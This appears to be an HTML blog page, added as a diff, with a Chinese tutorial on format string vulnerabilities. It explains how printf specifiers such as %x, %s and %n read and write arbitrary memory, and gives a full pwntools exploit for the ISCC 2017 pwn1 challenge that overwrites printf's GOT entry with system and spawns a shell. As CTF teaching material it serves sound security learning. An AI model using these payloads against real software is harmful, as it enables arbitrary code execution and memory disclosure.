@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>格式化字符串漏洞 | √素顏☃繁華夢☪</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="格式化字符串漏洞原理及其利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="http://yoursite.com/2017/09/22/格式化字符串漏洞/index.html">
+<meta property="og:site_name" content="√素顏☃繁華夢☪">
+<meta property="og:description" content="格式化字符串漏洞原理及其利用">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/3.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/4.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/5.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/6.png">
+<meta property="og:updated_time" content="2017-09-27T01:21:54.193Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串漏洞">
+<meta name="twitter:description" content="格式化字符串漏洞原理及其利用">
+<meta name="twitter:image" content="http://ote495tnr.bkt.clouddn.com/3.png">
+  
+    <link rel="alternate" href="/atom.xml" title="√素顏☃繁華夢☪" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-格式化字符串漏洞" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/22/格式化字符串漏洞/" class="article-date">
+  <time class="post-time" datetime="2017-09-22T03:49:58.000Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">22</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      格式化字符串漏洞
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="格式化字符串漏洞原理及其利用"><a href="#格式化字符串漏洞原理及其利用" class="headerlink" title="格式化字符串漏洞原理及其利用"></a>格式化字符串漏洞原理及其利用</h4><a id="more"></a>
+<h5 id="0x1-基础知识讲解"><a href="#0x1-基础知识讲解" class="headerlink" title="0x1 基础知识讲解"></a>0x1 基础知识讲解</h5><ol>
+<li>格式化字符串漏洞基本原理</li>
+</ol>
+<p>格式化字符串漏洞的产生主要源于对用户输入内容未进行过滤，这些输入数据都是作为参数传递给某些执行格式化操作的函数，如printf，fprintf，vprintf，sprintf等。恶意用户可以使用“%s”和“%x”等格式符，从堆栈或是其他内存位置输出数据，也可以使用格式符“%n”向任意地址写入任意数据，配合printf（）函数和其他类型功能的函数就可以向任意地址写入被格式化的字节数，可能导致任意代码执行，或者从漏洞程序中读取敏感信息，比如密码等。</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printf(&quot;My Nmane is: %s&quot;,&quot;test&quot;)</div></pre></td></tr></table></figure>
+<p>执行该函数后将返回字符串：<code>My Name is:test</code></p>
+<p>该printf函数的第一个参数就是格式化字符串，它用来告诉程序将数据以什么格式输出。printf（）函数个一般形式为printf（”format”，输出表列），format的结构为%[标志][输出最小宽度][.精度][长度]类型，以下是几种常见的格式化字符串参数：</p>
+<p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
+<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
+<p>%x：输出16进制数据，如%<code>i$x</code>表示要泄漏偏移i处4字节长的16进制数据，<code>%i$lx</code>表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
+<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀<code>0x</code>，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
+<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如<code>%i$s</code>表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
+<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如<code>%100x10$n</code>表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，<code>%$hhn</code>表示写入的地址空间为1字节，<code>%$lln</code>表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过<code>%$hn</code>或<code>%$hhn</code>来适时调整。</p>
+<p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
+<p>教程中遇到的关键技术：</p>
+<p>以下的N需要代换成10进制的整数，而且大小是有限制的。</p>
+<p>%N$p：以16进制的格式输出位于printf第N个参数位置的值；</p>
+<p>%N$s：以printf第N个参数位置的值为地址，输出这个地址指向的字符串的内容；</p>
+<p>%N$n：以printf第N个参数位置的值为地址，将输出过的字符数量的值写入这个地址中，对于32位elf而言，%n是写入4个字节，%hn是写入2个字节，%hhn是写入一个字节；</p>
+<p>%Nc：输出N个字符，这个可以配合%N$n使用，达到任意地址任意值写入的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">32位</div><div class="line">读</div><div class="line">&apos;%&#123;&#125;$x&apos;.format(index)           // 读4个字节</div><div class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 同上面</div><div class="line">&apos;$&#123;&#125;$s&apos;.format(index)</div><div class="line">写</div><div class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</div><div class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</div><div class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</div><div class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</div><div class="line">64位</div><div class="line">读</div><div class="line">&apos;%&#123;&#125;$x&apos;.format(index, num)      // 读4个字节</div><div class="line">&apos;%&#123;&#125;$lx&apos;.format(index, num)     // 读8个字节</div><div class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 读8个字节</div><div class="line">&apos;$&#123;&#125;$s&apos;.format(index)</div><div class="line">写</div><div class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</div><div class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</div><div class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</div><div class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</div><div class="line">%1$lx: RSI</div><div class="line">%2$lx: RDX</div><div class="line">%3$lx: RCX</div><div class="line">%4$lx: R8</div><div class="line">%5$lx: R9</div><div class="line">%6$lx: 栈上的第一个QWORD</div></pre></td></tr></table></figure>
+<p>关于print（）函数的使用，正常我们使用的函数是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">char str[100];</div><div class="line">scanf(&quot;%s&quot;,str);</div><div class="line">printf(&quot;%s&quot;,str);</div></pre></td></tr></table></figure>
+<p>这是正确的使用方式，但是也有人会这么用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">char str[100];</div><div class="line">scanf(&quot;%s&quot;,str);</div><div class="line">printf(str);</div></pre></td></tr></table></figure>
+<p>我们可以对比一下这两段代码，很明显，第二个程序中的printf（）函数参数用户是可控的，用户在控制了format参数之后结合printf（）函数的特性就可以进行相应的攻击。</p>
+<h5 id="0x2-漏洞利用"><a href="#0x2-漏洞利用" class="headerlink" title="0x2 漏洞利用"></a>0x2 漏洞利用</h5><p>特性一：printf（）函数的参数个数不固定</p>
+<p>可以利用这一特性进行越界数据的访问。先看一下正常的程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">int a=1,b=2,c=3;</div><div class="line">char buf[]=&quot;test&quot;;</div><div class="line">printf(&quot;%s %d %d %d\n&quot;,buf,a,b,c);</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译运行之后：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/3.png" alt="1"></p>
+<p>接下来做一个测试，增加一个print（）的format参数，改为<code>printf(&quot;%s %d %d %d %x %x\n&quot;,buf,a,b,c);</code></p>
+<p>编译运行后：<code>test 1 2 3 bfe83c44 b77f5d00</code></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/4.png" alt="2"></p>
+<p>从这里可以看出，printf按照我们的意愿打印出6个数值，但是后面两个数值不是我们输入当然参数，它是保存在栈中的数值，通过这个特性，只要构造出合适的格式化字符串我们就可以读取栈上的任意数据。</p>
+<p>上面的例子只是告诉我们可以利用<code>%x</code>一直读取栈内的数据，可是这并不能满足我们的需求，我们要的事任意地址的读取，当然这也是可以的，我们通过下面的例子进行分析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int main(int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">    char str[200];</div><div class="line">    fgets(str,200,stdin);</div><div class="line">    printf(str);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>编译运行并输入：<code>AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x</code>，成功的读取到了AAAA：<code>AAAA000000c8.b77325a0.8008960a.00000000.00000000.41414141.78383025.3830252e.30252e78</code>如果将AAAA换成地址，第6个%x换成%s读取参数指定的地址上的数据？是不是就可以读取任意内存地址的数据了？<br>那么我们就可以这么构造去获取0x41414141地址上的数据：<code>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</code><br>现在，我们可以利用格式化字符串漏洞读取内存的内容，看起来好像没也什么用，就是读个数据而已，我们能不能利用这个漏洞修改内存信息（比如说修改返回地址），从而劫持程序执行流程，这需要看printf函数的第二个特性。</p>
+<p>特性二：利用%n格式符写入数据</p>
+<p>%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，看下面的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">  int num=66666666;</div><div class="line">  printf(&quot;Before: num = %d\n&quot;, num);</div><div class="line">  printf(&quot;%d%n\n&quot;, num, &amp;num);</div><div class="line">  printf(&quot;After: num = %d\n&quot;, num);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以发现%n成功修改了num的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Before: num = 66666666</div><div class="line">66666666</div><div class="line">After: num = 8</div></pre></td></tr></table></figure>
+<p>现在我们已经知道可以用构造的格式化字符串去访问栈内的数据，并且可以利用%n向内存中写入值，那我们是不是可以修改某一个函数的返回地址从而控制 程序执行流程呢，到了这一步细心的同学可能已经发现了，%n的作用只是将前面打印的字符串长度写入到内存中，而我们想要写入的是一个地址，而且这个地址是很大的。这时候我们就需要用到printf()函数的第三个特性来配合完成地址的写入。</p>
+<p>特性三：自定义打印字符串的宽度</p>
+<p>我们在上面的基础部分已经有提到关于打印字符串宽度的问题，在格式符中间加上一个十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。我们把上一段代码做一下修改并看一下效果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">  int num=66666666;</div><div class="line">  printf(&quot;Before: num = %d\n&quot;, num);</div><div class="line">  printf(&quot;%.100d%n\n&quot;, num, &amp;num);</div><div class="line">  printf(&quot;After: num = %d\n&quot;, num);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看到我们的num值被改为了100</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Before: num = 66666666</div><div class="line">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666</div><div class="line">After: num = 100</div></pre></td></tr></table></figure>
+<p>这样就清楚如何去覆盖一个地址了吧，比如说，要把0x8048000这个地址输入内存，要做的就是把该地址对应的十进制134512640作为格式符控制宽度即可。</p>
+<p>如果需要修改的数据是相当大的数值，可以使用%02333d这种形式。在打印数值右侧用0补齐不足位数的方式来补齐。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">printf(&quot;%.134512640d%n\n&quot;, num, &amp;num);</div><div class="line">printf(&quot;After: num = %x\n&quot;, num);</div></pre></td></tr></table></figure>
+<p>运行后可以看到，num被成功的修改为：8048000</p>
+<p>实例：iscc 2017 pwn1</p>
+<ol>
+<li>checksec查看程序都开启了哪些保护</li>
+</ol>
+<p><img src="http://ote495tnr.bkt.clouddn.com/5.png" alt="3"></p>
+<p>这里程序开启了NX保护，所以不能再栈上写shellcode，只能考虑调用system函数，要调用一个函数：<br>（1）    我们首先要知道这个函数再内存中的地址<br>（2）    而且需要在栈上为程序布局好参数<br>（3）    还要能让地址跳到这个函数上去执行</p>
+<p>问题：system的地址如何获取？<br>利用printf函数，可以打印出任意内存的数据，那么我们就可以利用这个漏洞打印出got表中的函数在内存中的地址，比如说打印出：puts函数（libc中的函数）这样我们就知道一个libc中的函数，根据这个函数在给定的libc的偏移我们就可以还原出整个libc在内存中的布局情况，这样我们就很容易找到system函数在目标服务器中的地址，这个问题也就解决了。<br>如果这道题目没有给出libc？应该怎么去获取system的地址？首先Linux内核是在不断更新的，其中的libc版本也随着不断的更新，那么当libc的内容发生变化以后，其中函数之间的相对偏移肯定会发生变化，那么我们怎么才能根据已知的函数地址来得到目标函数的地址呢？</p>
+<p>做一个假设：<br>条件一：我们拥有从Linux发型以来所有的版本的libc文件<br>条件二：我们已知至少两个函数在目标主机中的真实地址，那我们是不是可以用第二个条件去推测目标主机的libc版本呢？</p>
+<p>进一步的分析：<br>关于条件二：<br>这里我们可以注意到：print是可以被我们循环调用的，因此可以进行连续的内存泄露，我们可以将多个got表中的函数地址泄露出来，这样就可以得到至少两个函数的地址，条件二满足<br>关于条件一：<br>这里给出一个网站：<a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a> ，pwntools中的DynELF就是根据这个原理运作的，两个条件都满足，根据这些函数之间的偏移去筛选出libc的版本，这样我们就相当于得到了目标服务器的libc文件，达到了同样的效果</p>
+<p>问题二和问题三：<br>假设：我们可以修改got表中的某个函数的地址到system的地址，那么程序在调用这个函数的时候其实调用的system函数了，根据格式化字符串漏洞的特性，我们知道是可以写任意内存的，那么这样就解决了第三个问题，怎么让地址跳到system函数<br>参数要怎么传递呢？<br>我们注意到，这个程序中存在以下libc中的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">puts</div><div class="line">scanf</div><div class="line">printf</div><div class="line">gets</div></pre></td></tr></table></figure></p>
+<p>如果我们可以控制上面函数的第一个参数为“/bin/sh”的地址，那么我们就相当于为system传递了参数，答案是肯定的<br>现在我们来看以下程序的执行流程：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/6.png" alt="4"></p>
+<p>在跳转到system函数之前，我们肯定要先调用printf将某一个函数的got表进行覆盖，那么我们应该覆盖哪个函数？<br>注意到printf函数的参数是我们输入的字符串的地址，如果我们先利用printf的got表修改system的地址，然后程序继续执行，在 gets 的地方我们输入 “/bin/sh”<br>然后程序自动执行 printf , 事实上 printf 已经被我们修改成了 system , 而且传递的参数就是我们输入的 /bin/sh，其实如果有一个函数的第一个参数是一个整形而且我们可以控制的话，我们也可以通过控制这个整形参数来达到执行 system(“/bin/sh”) 的目的，这样我们就完成了对漏洞利用过程的分析<br>利用脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p=remote(&quot;127.0.0.1&quot;,10001)</div><div class="line"></div><div class="line">#get print libc addr</div><div class="line">print_got=0x0804A010</div><div class="line">print_offset=0x4CDD0</div><div class="line">system_offset=0x3FE70</div><div class="line">p.recvuntil(&quot;input$&quot;)</div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.recvuntil(&quot;please input your name:\n&quot;)</div><div class="line">leak_payload=p32(print_got)+&quot;bb%6$saa&quot;</div><div class="line">p.sendline(leak_payload)</div><div class="line">p.recvuntil(&quot;bb&quot;)</div><div class="line">info=p.recvuntil(&quot;aa&quot;)[:-2]</div><div class="line">info=info[:4]</div><div class="line"></div><div class="line"># system libc addr</div><div class="line">print_addr=u32(info)</div><div class="line">print &quot;print_add:&quot;,hex(print_addr)</div><div class="line">system_addr=print_addr-print_offset+system_offset</div><div class="line"></div><div class="line">print &quot;system_addr:&quot;,hex(system_addr)</div><div class="line"></div><div class="line"># payload</div><div class="line">payload=fmtstr_payload(6,&#123;print_got: system_addr&#125;)</div><div class="line">print(payload)</div><div class="line">#send payload</div><div class="line">p.recvuntil(&quot;input$&quot;)</div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.recvuntil(&quot;please input your name:\n&quot;)</div><div class="line">p.sendline(payload)</div><div class="line">print(p.recv())</div><div class="line">#p.recvuntil(&quot;input$&quot;)</div><div class="line">#p.sendline(&quot;1&quot;)</div><div class="line">#p.recvuntil(&quot;please input your name:\n&quot;)</div><div class="line">p.sendline(&apos;/bin/sh&apos;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/22/格式化字符串漏洞/" data-id="cjfgehm37000ivgunnhy049yn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn，format/">pwn，format</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/09/23/格式化字符串漏洞利用（二）/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          格式化字符串漏洞利用（二）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/07/20/暑假夏令营二进制安全学习笔记/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">暑期夏令营</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">√素顏☃繁華夢☪</h1>
+    <h2 class="blog-subtitle">Go!Go!Go!</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/xiaorui1234" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://foxroot.cn/" target="_blank" title="FoxRoot">
+          FoxRoot
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 XiaoRui<br>
+      
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
